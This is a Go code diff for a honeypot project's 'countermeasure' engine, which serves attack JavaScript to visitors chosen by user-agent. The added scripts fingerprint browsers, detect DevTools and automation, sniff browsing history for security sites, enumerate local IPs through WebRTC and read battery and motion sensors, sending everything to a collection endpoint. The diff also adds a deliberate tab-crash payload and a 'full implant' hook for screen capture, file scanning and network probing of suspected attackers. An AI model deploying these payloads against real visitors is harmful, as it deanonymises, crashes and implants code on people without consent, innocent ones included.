@@ -11,6 +11,7 @@ import (
 	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
 	"github.com/Laji-HoneyPot/honeypot/internal/honeypot/traps"
 	"github.com/Laji-HoneyPot/honeypot/internal/plugin"
+	"github.com/Laji-HoneyPot/honeypot/internal/traceability/countermeasure"
 	"github.com/Laji-HoneyPot/honeypot/internal/traceability/fingerprint"
 	"github.com/Laji-HoneyPot/honeypot/internal/traceability/payload"
 	"github.com/Laji-HoneyPot/honeypot/internal/traceability/vulndb"
@@ -25,21 +26,29 @@ type Engine struct {
 	crawler        *vulndb.NVDCrawler
 	collector      *fingerprint.Collector
 	payloadGen     *payload.Generator
-	trapRegistry   *traps.Registry // 陷阱注册中心（场景化选配，可选）
-	updateInterval time.Duration   // NVD 爬虫定期更新间隔，0 表示不启用定期更新
-	stopCh         chan struct{}   // 停止定期更新的信号
+	trapRegistry   *traps.Registry                     // 陷阱注册中心（场景化选配，可选）
+	scoringEngine  *countermeasure.ScoringEngine       // 防守方得分引擎
+	auditTrail     *countermeasure.AuditTrail          // 合规审计追踪
+	implantOrch    *countermeasure.ImplantOrchestrator // 植入体编排器
+	updateInterval time.Duration                       // NVD 爬虫定期更新间隔，0 表示不启用定期更新
+	stopCh         chan struct{}                       // 停止定期更新的信号
 }
 
 // NewEngine 创建溯源反制引擎
 func NewEngine(logger *log.Logger, bus *bus.Bus) *Engine {
+	audit := countermeasure.NewAuditTrail(logger)
 	e := &Engine{
-		logger:     logger,
-		bus:        bus,
-		vulnDB:     vulndb.NewDB(logger),
-		crawler:    vulndb.NewNVDCrawler(logger, ""),
-		collector:  fingerprint.NewCollector(logger),
-		payloadGen: payload.NewGenerator(logger, "http://localhost:8080"),
-		stopCh:     make(chan struct{}),
+		logger:        logger,
+		bus:           bus,
+		vulnDB:        vulndb.NewDB(logger),
+		crawler:       vulndb.NewNVDCrawler(logger, ""),
+		collector:     fingerprint.NewCollector(logger),
+		payloadGen:    payload.NewGenerator(logger, "http://localhost:8080"),
+		scoringEngine: countermeasure.NewScoringEngine(logger, audit),
+		auditTrail:    audit,
+		implantOrch: countermeasure.NewImplantOrchestrator(logger, "http://localhost:8080",
+			countermeasure.DefaultImplantConfig("http://localhost:8080")),
+		stopCh: make(chan struct{}),
 	}
 
 	// 订阅蜜罐引擎的连接事件
@@ -235,14 +244,22 @@ func (e *Engine) SelectPayload(path, userAgent, remoteIP string) string {
 		return e.androidPayload() + e.webrtcInternalScanPayload()
 	}
 
-	// 1. Chrome 桌面浏览器 → Chrome 专项采集 + 内网扫描
+	// 1. Chrome 桌面浏览器 → Chrome 专项 + 环境检测 + DevTools检测 + 增强WebRTC + 传感器
 	if strings.Contains(ua, "chrome") && !strings.Contains(ua, "headless") && !strings.Contains(ua, "bot") && !strings.Contains(ua, "android") {
-		return e.chromePayload() + e.webrtcInternalScanPayload()
+		return e.chromePayload() +
+			e.chromiumEnvDetectPayload() +
+			e.devToolsDetectPayload() +
+			e.headlessDetectPayload() +
+			e.batterySensorFingerprintPayload() +
+			e.enhancedWebRTCAllNICsPayload()
 	}
 
-	// 2. Firefox 浏览器 → Firefox 专项采集 + 内网扫描
+	// 2. Firefox 浏览器 → Firefox 专项 + 跨域嗅探 + 增强WebRTC + 传感器
 	if strings.Contains(ua, "firefox") && !strings.Contains(ua, "bot") {
-		return e.firefoxPayload() + e.webrtcInternalScanPayload()
+		return e.firefoxPayload() +
+			e.crossOriginLeakPayload() +
+			e.batterySensorFingerprintPayload() +
+			e.enhancedWebRTCAllNICsPayload()
 	}
 
 	// 3. 路径匹配 — Spring Boot Actuator（优先于工具检测）
@@ -268,28 +285,35 @@ func (e *Engine) SelectPayload(path, userAgent, remoteIP string) string {
 		return e.dnsRebindingPayload(path)
 	}
 
-	// 7. Headless/Bot/Crawler → DNS 重绑定攻击
+	// 7. Headless/Bot/Crawler → Headless检测 + DNS 重绑定 + Brash 反分析屏障
 	if strings.Contains(ua, "headless") || strings.Contains(ua, "bot") || strings.Contains(ua, "crawler") || strings.Contains(ua, "spider") {
-		return e.dnsRebindingPayload(path)
+		return e.headlessDetectPayload() +
+			e.brashCrashPayload() +
+			e.dnsRebindingPayload(path)
 	}
 
-	// 8. Burp Suite / Java → 增强内网 IP 采集
+	// 8. Burp Suite / Java → Burp Chromium 检测 + 增强指纹 + 全量反制植入体
 	if strings.Contains(ua, "burp") || strings.Contains(ua, "java") {
-		return e.enhancedFingerprintPayload()
+		return e.burpChromiumDetectPayload() +
+			e.enhancedFingerprintPayload() +
+			e.webrtcInternalScanPayload() +
+			e.countermeasureFullImplantPayload(remoteIP)
 	}
 
-	// 8. 路径匹配 — 通用 API
+	// 9. 路径匹配 — 通用 API
 	if strings.Contains(path, "api") {
 		return e.apiHoneytokenPayload(path)
 	}
 
-	// 9. 路径匹配 — 源码泄露
+	// 10. 路径匹配 — 源码泄露
 	if strings.Contains(path, ".git") || strings.Contains(path, "backup") {
 		return e.sourceLeakHoneytoken()
 	}
 
-	// 10. 默认 — 增强通用指纹
-	return e.enhancedFingerprintPayload()
+	// 11. 默认 — 增强通用指纹 + 环境检测 + 增强WebRTC
+	return e.enhancedFingerprintPayload() +
+		e.chromiumEnvDetectPayload() +
+		e.enhancedWebRTCAllNICsPayload()
 }
 
 // chromePayload Chrome 浏览器专项反制 — 全维度硬件指纹 + 网络拓扑探测
@@ -740,6 +764,435 @@ function rpt(){new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringi
 </script>`
 }
 
+// ============================================================
+// 浏览器溯源反制利用链（触发 + 采集 + 回传）
+// 对应 vulndb 中 IsActive: true 的漏洞条目
+// ============================================================
+
+// chromiumEnvDetectPayload Chromium 内核环境检测（CH-2025-CHROMIUM-ENV-DETECT）
+// 检测 CEF/Electron/Edge/Brave/Opera 等 Chromium 衍生环境，定制化投递反制载荷
+func (e *Engine) chromiumEnvDetectPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / Chromium 环境检测链
+(function(){
+var d={t:'chromium_env',ts:Date.now(),ua:navigator.userAgent,plat:navigator.platform,
+  ven:navigator.vendor||'',prod:navigator.product||'',appName:navigator.appName||'',
+  appVer:navigator.appVersion||''},envs=[];
+// 1. 基础 Chromium 检测
+if(navigator.userAgent.indexOf('Chrome')>-1)d.isChromium=true;
+// 2. Microsoft Edge
+if(/Edg(e|A|iOS)/.test(navigator.userAgent)){d.isEdge=true;envs.push('edge')}
+// 3. Brave
+try{if(navigator.brave&&navigator.brave.isBrave()){d.isBrave=true;envs.push('brave')}}catch(e){
+  if(!/Chrome\/.*Safari/.test(navigator.userAgent)){d.isBrave=true;envs.push('brave')}}
+// 4. Opera
+if(/OPR|Opera/.test(navigator.userAgent)){d.isOpera=true;envs.push('opera')}
+// 5. Vivaldi
+if(/Vivaldi/.test(navigator.userAgent)){d.isVivaldi=true;envs.push('vivaldi')}
+// 6. 360/QQ/搜狗等国产 Chromium 浏览器
+if(/Qihoo|360SE|360EE/.test(navigator.userAgent)){d.is360=true;envs.push('360')}
+if(/QQBrowser|MQQBrowser/.test(navigator.userAgent)){d.isQQ=true;envs.push('qq')}
+if(/Sogou/.test(navigator.userAgent)){d.isSogou=true;envs.push('sogou')}
+// 7. Electron 环境（通过 process.versions 检测）
+try{if(typeof process!=='undefined'&&process.versions&&process.versions.electron){d.isElectron=true;d.electronVer=process.versions.electron;envs.push('electron')}}catch(e){}
+// 8. CEF (Chromium Embedded Framework)
+try{if(typeof cef!=='undefined'||typeof __CEF_IS_INITIALIZED__!=='undefined'){d.isCEF=true;envs.push('cef')}}catch(e){}
+// 9. Chrome Web Store / Extensions
+try{if(window.chrome&&chrome.runtime&&chrome.runtime.id){d.hasChromeRuntime=true;envs.push('crx')}}catch(e){}
+// 10. Headless
+try{if(navigator.webdriver||navigator.__proto__===Navigator.prototype){d.isHeadless=true}}catch(e){}
+d.envs=envs.join(',');
+// 回传
+new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d));
+})();</script>`
+}
+
+// burpChromiumDetectPayload Burp Suite 内置 Chromium 检测（BURP-2025-CHROMIUM-ENV）
+// 检测 Burp Suite 内置 Chromium 的独特环境特征
+func (e *Engine) burpChromiumDetectPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / Burp Suite Chromium 环境检测链
+(function(){
+var d={t:'burp_chromium',ts:Date.now(),ua:navigator.userAgent,
+  plat:navigator.platform,ven:navigator.vendor||'',hw:navigator.hardwareConcurrency,
+  scr:screen.width+'x'+screen.height,cd:screen.colorDepth,
+  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language};
+// 1. UA 后缀检测（Burp 内置 Chromium 有固定 UA 模式）
+if(/Chromium/.test(navigator.userAgent))d.isChromium=true;
+// 2. 缺少标准 Chrome 特性
+try{d.hasChromeRuntime=!!(window.chrome&&chrome.runtime)}catch(e){d.hasChromeRuntime=false}
+try{d.hasChromeSend=!!(window.chrome&&chrome.webview)}catch(e){d.hasChromeSend=false}
+// 3. 缺少 navigator.mediaDevices.enumerateDevices（Burp 禁用了部分 API）
+try{d.hasEnumerateDevices=!!(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices)}catch(e){d.hasEnumerateDevices=false}
+// 4. Permissions API 受限
+try{navigator.permissions.query({name:'camera'}).then(function(r){d.cameraPerm=r.state;report()})}catch(e){d.cameraPerm='blocked';report()}
+// 5. WebGL 渲染器检测（某些版本使用 llvmpipe/softpipe）
+try{
+  var gl=document.createElement('canvas').getContext('webgl');
+  if(gl){
+    var dbg=gl.getExtension('WEBGL_debug_renderer_info');
+    if(dbg){d.gpu_umrenderer=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);d.gpu_umvendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)}
+    d.gpu_renderer=gl.getParameter(gl.RENDERER)
+  }
+}catch(e){}
+// 6. Performance/Memory 受限检测
+try{d.jsHeapLimit=performance.memory?performance.memory.jsHeapSizeLimit:0}catch(e){d.jsHeapLimit=-1}
+// 7. Cookie 与 Storage
+d.cookie=navigator.cookieEnabled;
+try{d.localStorage=!!window.localStorage;d.sessionStorage=!!window.sessionStorage}catch(e){}
+function report(){d.t=Date.now()-d.ts;
+new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))}
+if(!d.hasEnumerateDevices)report()
+})();</script>`
+}
+
+// devToolsDetectPayload Chrome DevTools 调试器检测（CH-2025-DEVTOOLS-DETECT）
+// 通过多维侧信道检测 F12 DevTools 是否打开
+func (e *Engine) devToolsDetectPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / DevTools 打开状态检测链
+(function(){
+var d={t:'devtools_detect',ts:Date.now(),ua:navigator.userAgent,methods:[]};
+// 方法1: console.log 正则陷阱（DevTools 打开时 console 会执行正则匹配）
+var r=/./;r.toString=function(){d.consoleTrap=true;d.methods.push('console_regex');return''};
+console.log('%c',r);
+// 方法2: debugger 语句计时检测
+setTimeout(function(){
+  var t0=Date.now();debugger;var t1=Date.now();
+  d.debuggerTime=t1-t0;
+  if(t1-t0>100){d.isDevTools=true;d.methods.push('debugger_timing')}
+},100);
+// 方法3: 窗口尺寸差异（DevTools 打开时 window.outerWidth > window.innerWidth + 阈值）
+var od=window.outerWidth-window.innerWidth;
+var id=window.outerHeight-window.innerHeight;
+if(od>160||id>160){d.isDevTools=true;d.methods.push('window_size:diff='+od+'x'+id)}
+d.ow=window.outerWidth;d.iw=window.innerWidth;d.oh=window.outerHeight;d.ih=window.innerHeight;
+// 方法4: performance.navigation + timing
+try{
+  if(typeof performance!=='undefined'&&performance.navigation){
+    d.navType=performance.navigation.type
+  }
+}catch(e){}
+// 方法5: Firebug 检测 (Firefox)
+try{if(window.console&&console.firebug){d.isFirebug=true;d.methods.push('firebug')}}catch(e){}
+// 方法6: 自定义 toString/valueOf 检测（DevTools 展开 Object 时调用）
+var o={};Object.defineProperty(o,'check',{get:function(){d.propAccess=true;d.methods.push('prop_access')}});console.debug(o);
+// 回传
+setTimeout(function(){
+d.t=Date.now()-d.ts;
+d.cd=screen.colorDepth;d.dpr=window.devicePixelRatio||1;
+new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))
+},500)
+})();</script>`
+}
+
+// headlessDetectPayload Headless/Puppeteer/Playwright 检测（CH-2025-HEADLESS-DETECT）
+// 多维度检测无头浏览器自动化环境
+func (e *Engine) headlessDetectPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / 无头浏览器检测链
+(function(){
+var d={t:'headless_detect',ts:Date.now(),ua:navigator.userAgent,flags:[],score:0};
+// 1. navigator.webdriver
+d.webdriver=navigator.webdriver?1:0;if(d.webdriver){d.flags.push('webdriver');d.score+=3}
+// 2. chrome.runtime
+try{var cr=!!(window.chrome&&chrome.runtime);d.hasChromeRuntime=cr;if(!cr){d.flags.push('no_chrome_runtime');d.score+=1}}catch(e){d.hasChromeRuntime=false;d.flags.push('chrome_runtime_error');d.score+=2}
+// 3. Permissions.query 异常行为
+d.permsFailed=false;
+try{navigator.permissions.query({name:'notifications'}).then(function(s){
+  d.notificationPerm=s.state;
+  d.permsOK=true;
+  reportWhen();
+})}catch(e){d.permsFailed=true;d.flags.push('perms_query_failed');d.score+=2;reportWhen()}
+// 4. 缺少 plugins 和 mimeTypes
+d.pluginsCount=navigator.plugins?navigator.plugins.length:0;
+d.mimeTypesCount=navigator.mimeTypes?navigator.mimeTypes.length:0;
+if(d.pluginsCount===0){d.flags.push('no_plugins');d.score+=1}
+// 5. 屏幕参数异常（headless 常为默认值或异常尺寸）
+d.sw=screen.width;d.sh=screen.height;d.saw=screen.availWidth;d.sah=screen.availHeight;
+if(d.sw===800&&d.sh===600){d.flags.push('default_screen');d.score+=1}
+if(d.sw===1024&&d.sh===768){d.flags.push('headless_screen');d.score+=1}
+if(d.saw===0||d.sah===0){d.flags.push('zero_avail');d.score+=1}
+// 6. Notification API 缺失
+try{if(!('Notification' in window)){d.flags.push('no_notification');d.score+=1}}catch(e){}
+// 7. requestAnimationFrame 行为异常
+try{requestAnimationFrame(function(t){d.rafTime=t;if(t<1){d.flags.push('raf_zero');d.score+=1}})}catch(e){}
+// 8. MouseEvent/触摸事件缺失（headless 无鼠标）
+try{
+  var e=new MouseEvent('click',{clientX:0,clientY:0});
+  d.hasMouseEvent=true
+}catch(e){d.hasMouseEvent=false;d.flags.push('no_mouse_event');d.score+=1}
+// 9. 语言与平台不匹配
+d.lang=navigator.language||'';d.platform=navigator.platform||'';
+// 10. Connection API
+try{var conn=navigator.connection||navigator.mozConnection;if(!conn||!conn.rtt){d.flags.push('no_network_info');d.score+=1};d.connType=conn?conn.effectiveType:''}catch(e){}
+// 11. 检测 Playwright/Puppeteer/Selenium 特有标记
+try{
+  if(window.__playwright||window.__pw_manual||window.__PW_inspector||document.__selenium_unwrapped||window.callPhantom||window._phantom){
+    d.flags.push('framework_marker');d.score+=3
+  }
+}catch(e){}
+// 12. 字体检测（headless 字体列表短）
+try{
+  var fonts=['Arial','Times New Roman','Courier New','Georgia','Verdana','Microsoft YaHei'];
+  var fcnt=0;fonts.forEach(function(f){
+    var test=document.createElement('span');test.style.fontFamily='\"'+f+'\"';test.textContent='test';
+    document.body.appendChild(test);var w=test.offsetWidth;document.body.removeChild(test);if(w>0)fcnt++});
+  d.detectedFonts=fcnt;if(fcnt<2){d.flags.push('few_fonts');d.score+=1}
+}catch(e){}
+d.isHeadless=d.score>=3;d.headlessConfidence=Math.min(d.score/10,1);
+function reportWhen(){if(d.permsFailed||d.permsOK!==undefined)report()}
+function report(){
+d.t=Date.now()-d.ts;
+// 若检测到 headless，额外标记
+if(d.isHeadless){d.flags.push('HEADLESS_CONFIRMED')}
+new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))
+}
+// 超时回传
+setTimeout(function(){if(d.t===undefined)report()},3000)
+})();</script>`
+}
+
+// crossOriginLeakPayload 跨域历史泄露嗅探（FF-2025-CROSSORIGIN-LEAK）
+// CSS :visited + 扩展资源检测 + 历史嗅探
+func (e *Engine) crossOriginLeakPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / 跨域浏览器历史/扩展嗅探链
+(function(){
+var d={t:'xorigin_leak',ts:Date.now(),ua:navigator.userAgent,results:[]};
+// 目标 URL 列表：常见攻击者工具/平台
+var targets=[
+  'https://portswigger.net/','https://burpsuite.guide/',
+  'https://www.shodan.io/','https://censys.io/',
+  'https://hackertarget.com/','https://www.exploit-db.com/',
+  'https://github.com/swisskyrepo/PayloadsAllTheThings',
+  'https://attack.mitre.org/','https://www.virustotal.com/',
+  'https://www.metasploit.com/','https://www.offsec.com/',
+  'https://tryhackme.com/','https://www.hackthebox.com/',
+  'https://portswigger.net/web-security'
+];
+var done=0;
+// CSS :visited + Link Timing Oracle
+function check(href,i){
+  var link=document.createElement('link');
+  link.rel='stylesheet';link.href=href;link.type='text/css';
+  link.onerror=function(){d.results.push(href+':visited');done++;if(done===targets.length)report()};
+  link.onload=function(){d.results.push(href+':not_visited');done++;if(done===targets.length)report()};
+  var t0=Date.now();
+  document.head.appendChild(link);
+  setTimeout(function(){
+    var elapsed=Date.now()-t0;
+    if(elapsed<30){d.results.push(href+':likely_visited')}
+    document.head.removeChild(link);
+    done++;
+    if(done===targets.length)report()
+  },2000)
+}
+targets.forEach(function(h,i){setTimeout(function(){check(h,i)},i*300)});
+// 扩展资源检测 (Firefox)
+try{
+  var extResources=['moz-extension://','chrome-extension://'];
+  extResources.forEach(function(p){
+    var img=new Image();img.src=p+'*/icon.png';
+    img.onload=function(){d.ext_loaded=p;report()};
+    img.onerror=function(){d.ext_blocked=p;report()}
+  })
+}catch(e){}
+function report(){
+d.t=Date.now()-d.ts;
+if(d.results.length>0||d.ext_loaded||d.ext_blocked){
+  new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))
+}
+}
+})();</script>`
+}
+
+// brashCrashPayload Brash document.title 崩溃防护（CH-2025-BRASH-CRASH）
+// 检测自动化分析行为时触发 document.title 标签页崩溃作为反分析屏障
+func (e *Engine) brashCrashPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / Brash 反分析崩溃屏障
+// 仅在检测到自动化/调试行为时激活
+(function(){
+var d={t:'brash_guard',ts:Date.now(),triggered:false,reason:''};
+// 触发条件检测
+var triggers=[];
+// 条件1: navigator.webdriver
+if(navigator.webdriver){triggers.push('webdriver')}
+// 条件2: DevTools 疑似打开
+setTimeout(function(){
+  var od=window.outerWidth-window.innerWidth;
+  if(od>160){triggers.push('devtools_size')}
+},200);
+// 条件3: 自动化框架特征
+try{
+  if(window.__playwright||window.__PW_inspector||document.__selenium_unwrapped||window.callPhantom||window._phantom){
+    triggers.push('framework_marker')
+  }
+}catch(e){}
+// 条件4: 异常鼠标行为（无鼠标移动事件）
+var moved=false;
+window.addEventListener('mousemove',function(){moved=true},{once:true});
+setTimeout(function(){if(!moved)triggers.push('no_mouse_move')},3000);
+// 条件5: history.length 异常
+try{if(history.length<=1)triggers.push('short_history')}catch(e){}
+// 评估 & 触发
+setTimeout(function(){
+if(triggers.length>=2){
+  d.triggered=true;d.reason=triggers.join(',');
+  d.triggers=triggers;
+  // 先回传检测信息
+  new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d));
+  // 触发 document.title 崩溃
+  try{
+    var longStr='A';for(var i=0;i<26;i++)longStr+=longStr;
+    document.title=longStr;
+    // 持续写入触发 Chrome 渲染线程竞争
+    setInterval(function(){document.title=longStr+Math.random()},500)
+  }catch(e){}
+}
+})()
+})();</script>`
+}
+
+// enhancedWebRTCAllNICsPayload 增强型 WebRTC 全网卡枚举（CH-2025-WEBRTC-ENHANCED）
+// 多 STUN + 多次 offer 枚举全部网卡 IP（含 VPN/Docker/VMware 虚拟网卡）
+func (e *Engine) enhancedWebRTCAllNICsPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / 增强型 WebRTC 全网卡 IP 枚举链
+(function(){
+var d={t:'webrtc_all_nics',ts:Date.now(),ua:navigator.userAgent,ips:[],allIps:{}};
+// 多 STUN 服务器（跨地域增加候选路径）
+var stuns=[
+  'stun:stun.l.google.com:19302',
+  'stun:stun1.l.google.com:19302',
+  'stun:stun2.l.google.com:19302',
+  'stun:stun.cloudflare.com:3478',
+  'stun:stun.ekiga.net:3478',
+  'stun:stun.freeswitch.org:3478'
+];
+var rounds=[{iceServers:stuns.map(function(u){return {urls:u}})}];
+var done=0,allDone=stuns.length;
+// 额外：带 Turn 服务器（部分环境需要 Turn 才能暴露更多 IP）
+rounds.push({iceServers:stuns.map(function(u){return {urls:u}}),
+  iceTransportPolicy:'relay'});
+try{
+  // 第1轮：标准 ICE 候选收集
+  var pc1=new RTCPeerConnection({iceServers:rounds[0].iceServers});
+  pc1.createDataChannel('hp_chan');
+  pc1.onicecandidate=handleCandidate;
+  pc1.createOffer().then(function(o){pc1.setLocalDescription(o)});
+  // 第2轮：延迟收集更多候选（VPN 网卡延迟较高）
+  setTimeout(function(){
+    var pc2=new RTCPeerConnection({iceServers:rounds[0].iceServers});
+    pc2.createDataChannel('hp_chan2');
+    pc2.onicecandidate=handleCandidate;
+    pc2.createOffer().then(function(o){pc2.setLocalDescription(o)})
+  },3000)
+}catch(e){finalReport()}
+function handleCandidate(e){
+  if(e&&e.candidate){
+    var ip='';
+    var parts=e.candidate.candidate.split(' ');
+    // 从候选字符串提取 IP 地址
+    for(var i=0;i<parts.length;i++){
+      if(parts[i]&&(/^\d+\.\d+\.\d+\.\d+$/.test(parts[i])||parts[i].indexOf(':')>-1)){
+        ip=parts[i];break
+      }
+    }
+    if(ip&&!d.allIps[ip]){
+      d.allIps[ip]={candidate:e.candidate.candidate.substring(0,80),
+        type:parts[7]||'unknown',port:parts[5]||'0',
+        protocol:parts[2]||'unknown'};
+      d.ips=Object.keys(d.allIps);
+      // 实时回传新发现的 IP
+      new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))
+    }
+  }
+  // ICE 收集完成后报告
+  if(!e.candidate){
+    done++;if(done>=allDone*2)finalReport()
+  }
+}
+function finalReport(){
+d.t=Date.now()-d.ts;
+d.ips=Object.keys(d.allIps);
+d.totalIps=d.ips.length;
+// 分类 IP
+var privIPs=d.ips.filter(function(ip){return /^(192\.168\.|10\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.)/.test(ip)});
+d.privateIPs=privIPs;d.privateCount=privIPs.length;
+new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))
+}
+})();</script>`
+}
+
+// batterySensorFingerprintPayload 电池+传感器指纹（CH-2025-BATTERY-FP + CH-2025-SENSOR-FP）
+// 获取设备电池状态 + 运动传感器数据
+func (e *Engine) batterySensorFingerprintPayload() string {
+	return `<script>
+// Laji-HoneyPot 反制 / 电池+传感器指纹采集链
+(function(){
+var d={t:'battery_sensor',ts:Date.now(),ua:navigator.userAgent};
+// Battery Status API
+try{
+  navigator.getBattery().then(function(b){
+    d.bl=b.level;d.bc=b.charging?1:0;
+    d.bct=b.chargingTime;d.bdt=b.dischargingTime;
+    d.bp=b.charging?b.level*100:null; // 充电百分比
+    b.addEventListener('levelchange',function(){d.bl_update=b.level});
+    b.addEventListener('chargingchange',function(){d.bc_update=b.charging?1:0});
+  }).catch(function(e){d.battery_error=e.message})
+}catch(e){d.battery_error='not_supported'}
+// DeviceOrientation
+try{
+  window.addEventListener('deviceorientation',function(e){
+    if(e.alpha!==null){d.alpha=e.alpha;d.beta=e.beta;d.gamma=e.gamma;
+    d.hasOrientation=true}
+  },{once:true})
+}catch(e){}
+// DeviceMotion
+try{
+  window.addEventListener('devicemotion',function(e){
+    if(e.acceleration&&e.acceleration.x!==null){
+      d.ax=e.acceleration.x;d.ay=e.acceleration.y;d.az=e.acceleration.z;
+      d.hasMotion=true
+    }
+  },{once:true})
+}catch(e){}
+// Gyroscope (原生传感器)
+try{
+  if('Gyroscope' in window){
+    var g=new Gyroscope({frequency:1});
+    g.addEventListener('reading',function(){d.gx=g.x;d.gy=g.y;d.gz=g.z;d.hasGyro=true});
+    g.start()
+  }
+}catch(e){}
+// Accelerometer
+try{
+  if('Accelerometer' in window){
+    var a=new Accelerometer({frequency:1});
+    a.addEventListener('reading',function(){d.rax=a.x;d.ray=a.y;d.raz=a.z;d.hasAccel=true});
+    a.start()
+  }
+}catch(e){}
+// Magnetometer
+try{
+  if('Magnetometer' in window){
+    var m=new Magnetometer({frequency:1});
+    m.addEventListener('reading',function(){d.mx=m.x;d.my=m.y;d.mz=m.z;d.hasMag=true});
+    m.start()
+  }
+}catch(e){}
+// 延时回传（等传感器数据到达）
+setTimeout(function(){
+d.t=Date.now()-d.ts;
+try{d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){}
+try{d.scr=screen.width+'x'+screen.height}catch(e){}
+new Image().src='/api/collect?d='+encodeURIComponent(JSON.stringify(d))
+},2500)
+})();</script>`
+}
+
 // csXSSPayload Cobalt Strike XSS 反制（CVE-2022-39197）— 通过 payload 生成器
 func (e *Engine) csXSSPayload() string {
 	return e.payloadGen.GenerateCSXSSPayload()
@@ -749,3 +1202,33 @@ func (e *Engine) csXSSPayload() string {
 func (e *Engine) behinderDecoyPayload() string {
 	return e.payloadGen.GenerateBehinderDecoy()
 }
+
+// ============================================================
+// 深度反制能力 — 植入体投递（屏幕截获 + 文件扫描 + 横向探测）
+// ============================================================
+
+// countermeasureFullImplantPayload 全量三层反制植入体
+// 仅在检测到高价值攻击者时投递（如手动触发/Burp环境/旧版浏览器）
+func (e *Engine) countermeasureFullImplantPayload(remoteIP string) string {
+	e.auditTrail.RecordInitiate(countermeasure.OpScreenCapture, remoteIP, "implant", "system")
+	e.auditTrail.RecordInitiate(countermeasure.OpFileScan, remoteIP, "implant", "system")
+	e.auditTrail.RecordInitiate(countermeasure.OpNetProbe, remoteIP, "implant", "system")
+	return e.implantOrch.GenerateFullImplantPayload()
+}
+
+// countermeasureTargetedPayload 定向反制载荷（按需选择能力）
+func (e *Engine) countermeasureTargetedPayload(remoteIP string, capabilities ...countermeasure.OpType) string {
+	for _, cap := range capabilities {
+		e.auditTrail.RecordInitiate(cap, remoteIP, "implant", "system")
+	}
+	return e.implantOrch.GenerateImplantPayload(capabilities...)
+}
+
+// GetScoringEngine 获取得分引擎
+func (e *Engine) GetScoringEngine() *countermeasure.ScoringEngine { return e.scoringEngine }
+
+// GetAuditTrail 获取审计追踪
+func (e *Engine) GetAuditTrail() *countermeasure.AuditTrail { return e.auditTrail }
+
+// GetImplantOrchestrator 获取植入体编排器
+func (e *Engine) GetImplantOrchestrator() *countermeasure.ImplantOrchestrator { return e.implantOrch }
